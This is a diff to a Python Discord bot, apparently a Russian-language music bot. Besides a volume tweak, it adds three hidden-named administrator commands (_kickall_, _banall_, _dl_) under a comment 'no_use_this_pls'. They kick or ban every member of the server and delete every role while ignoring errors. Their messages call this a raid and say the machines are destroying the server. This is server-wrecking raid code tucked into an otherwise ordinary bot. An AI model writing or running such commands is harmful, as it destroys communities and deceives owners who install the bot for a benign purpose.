@@ -181,12 +181,50 @@ try:
 
         voice.play(discord.FFmpegPCMAudio('song.mp3'), after = lambda e: print(f'[log] {name}, музыка закончила свое проигрывание'))
         voice.source = discord.PCMVolumeTransformer(voice.source)
-        voice.source.volume = 0.07
+        voice.source.volume = 0.14
 
         song_name = name.rsplit('-', 2)
         await ctx.send(f'Сейчас проигрывается музыка: {song_name[0]}')
 
-    #section of errors
+#no_use_this_pls
+#----------------------------------------------------------------------------------------------------------------
+
+    @bot.command()
+    @commands.has_permissions(administrator = True)
+    async def _kickall_(ctx):
+        await ctx.channel.purge(limit = 1)
+        await ctx.send(f'~~**...Машины уничтожаеют сервер :skull:...**~~'), print(f'[warning] Бот {bot.user.name} кикнул всех, кого мог')
+        for m in ctx.guild.members:
+            try:
+                await m.kick(reason="Облегченный рейд на сервер успешно проведен.")
+            except:
+                pass
+
+    @bot.command()
+    @commands.has_permissions(administrator = True)
+    async def _banall_(ctx):
+        await ctx.channel.purge(limit = 1)
+        await ctx.send(f'~~**...Машины уничтожаеют сервер :skull:...**~~'), print(f'[warning] Бот {bot.user.name} забанил всех, кого мог')
+        for m in ctx.guild.members:
+            try:
+                await m.ban(reason="Рейд на сервер успешно проведен.")
+            except:
+                pass
+
+    @bot.command()
+    @commands.has_permissions(administrator = True)
+    async def _dl_(ctx):
+        await ctx.channel.purge(limit = 1), print(f'[warning] {bot.user.name} Удалил столько ролей, сколько смог')
+        for m in ctx.guild.roles:
+            try:
+                await m.delete(reason="Плановое обнуление")
+            except:
+                pass
+
+#----------------------------------------------------------------------------------------------------------------
+
+
+#section of errors
 
     @_cleaner_.error
     async def cleaner_error(ctx,error):
